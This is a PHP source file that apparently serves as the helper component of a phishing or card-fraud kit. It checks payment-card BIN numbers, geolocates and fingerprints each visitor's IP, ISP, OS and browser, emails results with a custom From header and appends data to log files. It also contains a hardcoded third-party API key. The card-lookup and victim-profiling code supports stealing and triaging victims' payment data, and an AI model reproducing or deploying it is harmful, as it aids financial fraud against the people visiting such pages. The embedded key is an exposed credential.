<?php
error_reporting(0);
date_default_timezone_set("America/New_York");


function check_bin($bin) {
      $bin = preg_replace('/\s/', '', $bin);
      $bin = substr($bin,0,8);
      $url = "https://lookup.binlist.net/".$bin;
      $headers = array();
      $headers[] = 'Accept-Version: 3';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $resp = curl_exec($ch);
      curl_close($ch);
      $result = json_decode($resp, true);
      return $result;
}
function kirim_mail($to, $from, $subject, $message) {
    global $sender_mail;
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $head = "Content-type:text/plain;charset=UTF-8\r\n";
     $head .= "From: $from <$sender_mail>" . "\r\n"; // Settingan From Name/Email
     mail($to,$subject,$message,$head);
}

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
}
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
$ispuser = getisp($ip);
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);



$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://api.ipgeolocation.io/ipgeo?apiKey=e67d9cc3814a4ee992689b305cade242&ip=$ip");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $result = json_decode($result);
 
 //define all array
$isocode ="$result->country_code2";
$asn = "$result->country_name";
$city = "$result->city";
$continent_name ="$result->country_name";
$zip="$result->country_code3";
$isp="$result->isp";











